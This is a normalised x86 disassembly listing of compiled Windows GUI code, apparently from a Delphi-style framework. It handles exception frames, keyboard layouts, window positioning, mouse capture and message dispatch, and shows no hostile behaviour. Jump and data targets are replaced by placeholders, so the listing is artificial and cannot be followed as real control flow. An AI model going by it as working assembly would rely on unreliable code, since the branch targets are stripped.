jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4662f4
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_44db4c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44dbd6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dbdd
lea eax [ ebp - 0x4 ]
call sub_404008
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4664f4
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407ec0
test eax eax
je r-xdata
mov eax ebx
call sub_44f2dc
mov dl 0x1
call sub_453f20
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_44dc38
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_416cc4
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_449ca8
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_44dc88
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_44dcbc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_40348c
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_40348c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_44dcfc
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_449ca8
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_44dd54
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_420c1c
mov edx [ r-xdata ]
call sub_403440
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_44dd8c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_418310
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44ddb0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_44f2dc
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_44de0c
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_44dd78
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_418310
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_44de4c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_40588c
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_40588c
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_44deb8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_44df60
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44df67
lea eax [ ebp - 0x4 ]
call sub_405874
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_4467a0
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_403290
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_405874
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_40348c
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_40588c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ edi + 0x178 ] eax
sub_44df70
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_44bb74
xor edx edx
push ebp
push sub_44e032
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_40348c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e039
mov eax [ ebp - 0x4 ]
call sub_44bb7c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_44e039
mov eax [ ebp - 0x4 ]
call sub_45f870
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_448d54
sub_44e084
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4031d8
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44a968
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_44e0ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_448d54
sub_44e108
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_44e130
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_45f870
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_45f778
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_40348c
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44e130
test al al
jne r-xdata
sub_44e198
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e130
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_450448
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44e1c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e130
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_450448
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44e1f0
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_44e218
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_45f870
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_45f778
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_40348c
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44e218
test al al
jne r-xdata
sub_44e280
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e218
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44e2a0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e218
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44e2e0
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_45f870
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_40348c
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44e2e0
test al al
jne r-xdata
sub_44e344
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e2e0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44e364
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c00c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44bfd0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_449ca8
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44e364
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_44e414
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_44e364
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_45f870
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_449ca8
test eax eax
jne r-xdata
sub_44e4bc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44cf5c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44e4dc
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44cf5c
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44e510
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44cf5c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44e530
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_44e580
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_44e5a4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_447dc0
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_44c00c
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_44bfd0
mov dl [ esp ]
mov si 0xffd1
call sub_40348c
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_44e5fc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_40348c
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_44e620
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_40348c
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_44e658
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44a77c
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_44c06c
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_44c87c
sub_44e690
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_40348c
pop esi
pop ebx
retn
mov eax ebx
call sub_449138
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_4044c8
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_4044c8
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_44e710
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44cc5c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44a850
sub_44e770
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_44c9d0
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_44bdcc
pop ebx
retn
sub_44e7a0
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_44e7c8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_44bdcc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_44e838
push ebx
mov ebx eax
mov eax ebx
call sub_44a6bc
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_44c06c
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_4237fc
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_449ca8
sub_44e874
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_4473a0
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_44f2dc
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_449ca8
sub_44e8b4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44f5e0
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_44f2dc
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44e8f4
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_44c06c
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_44f1e4
sub_44e934
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_44f41c
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_44f41c
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_44e994
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_449704
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_448638
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_44cbc8
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_44ea04
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44a7f4
mov edx esi
mov eax ebx
call sub_44c02c
pop esi
pop ebx
retn
sub_44ea20
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_445a30
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_45f870
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_40348c
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_40348c
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_40348c
test al al
jne r-xdata
sub_44eab4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_450448
mov edx esi
mov eax ebx
call sub_44ea20
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_449ca8
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_449ca8
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_449ca8
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_45f870
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_449ca8
test eax eax
jne r-xdata
jmp r-xdata
sub_44eb98
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_449ca8
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_44ebec
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_449ca8
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_45f870
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_449ca8
test eax eax
jne r-xdata
sub_44ec38
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_44ea20
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_449ca8
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_45f870
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_449ca8
test eax eax
jne r-xdata
sub_44ec94
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_45f870
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_449ca8
mov [ esi + 0xc ] eax
sub_44ecc8
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_448148
mov eax ebx
mov si 0xffd0
call sub_40348c
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
